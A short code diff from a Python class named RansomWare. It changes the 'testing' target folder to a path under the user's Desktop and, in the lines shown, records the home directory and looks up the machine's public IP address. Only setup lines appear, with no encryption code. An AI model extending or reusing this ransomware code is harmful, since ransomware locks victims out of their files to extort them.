@@ -48,7 +48,7 @@ class RansomWare:
            
         '''
         self.sysRoot = os.path.expanduser('~')
-        self.localRoot = r'C:\Users\Lenovo\Desktop\hehe' #Testing
+        self.localRoot = os.path.expanduser('~') + r'\Desktop\testfolder' #Testing
         self.publicIP = requests.get('https://api.ipify.org').text
 
 
